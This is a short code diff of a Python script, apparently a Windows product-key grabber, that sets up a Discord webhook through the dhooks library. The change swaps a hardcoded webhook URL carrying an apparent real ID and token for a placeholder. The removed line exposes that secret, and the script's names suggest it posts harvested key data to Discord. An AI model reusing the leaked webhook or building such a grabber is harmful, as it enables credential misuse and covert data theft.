@@ -5,7 +5,7 @@ import requests
 from dhooks import Webhook, Embed
 
 #webhooks
-winkey_hook = Webhook(f"https://discord.com/api/webhooks/796947408256892939/54Q1evPVpr0tDorht2khCiAmp1SeYBhDUCij_lVB5wneQfOUkt5ePnj9iGwpnPmPJ-3-")
+winkey_hook = Webhook(f"https://discord.com/api/webhooks/put_your_api_here")
 
 #main code
 def winkey():
